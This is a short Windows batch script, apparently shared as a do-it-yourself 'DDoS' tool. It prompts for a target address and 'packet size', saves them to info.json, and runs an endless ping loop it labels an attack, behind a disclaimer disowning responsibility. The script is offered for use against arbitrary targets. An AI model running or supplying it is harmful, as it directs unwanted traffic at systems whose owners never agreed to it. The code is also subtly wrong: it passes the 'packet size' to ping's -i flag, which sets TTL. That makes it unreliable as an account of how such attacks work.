@echo off
echo Warning!! The creator of this Script has the rights to not be included in the trouble this causes you! I am able to say this because i cannot be blamed for the trouble given to you using this script>disclaimer.txt
echo PLEASE READ THE disclaimer.txt
echo PLEASE READ THE disclaimer.txt
echo PLEASE READ THE disclaimer.txt
echo PLEASE READ THE disclaimer.txt
echo PLEASE READ THE disclaimer.txt
title Batch.Spam: REQUESTING URL ADDRESS
echo -------------------
echo URI Address to ping
echo -------------------
set /p uriAddress="What is the address you want to ping?: "
ping %uriAddress%
title Batch.DDoS: Asking for info gotten from pinged URL
echo -------------------
echo "   Info to DDOS  "
echo -------------------
set /p ipAddress="IP Address: "
set /p packetSize="Packet Size: "

@echo {> info.json
@echo    "URL": "%uriAddress%",>> info.json
@echo    "ipAddress": "%ipAddress%",>> info.json
@echo    "packetSize": "%packetSize%">> info.json
@echo }>> info.json

:Attack
title Batch.Spam: Attack  in PROGRESS [Info saved to info.json]
echo - SENDING ATTACK -
ping %ipAddress% -i %packetSize% -t >nul
goto Attack
